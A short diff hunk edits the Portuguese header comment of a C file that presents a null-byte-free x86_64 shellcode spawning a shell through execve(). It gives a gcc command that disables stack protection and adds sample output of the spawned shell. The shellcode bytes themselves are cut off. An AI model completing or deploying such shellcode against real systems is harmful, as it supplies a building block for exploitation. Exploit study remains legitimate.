@@ -3,6 +3,9 @@ Shellcode nullbyte-free
  Executa uma shell com a syscall execve() em arquitetura x86_64
  by vold (sysh0ck)
  gcc -z execstack -o shell xxx.c
+ ./shell
+ $ pwd
+ $ /home/vold
  */
 #include <stdio.h>
 const char vold[] = 
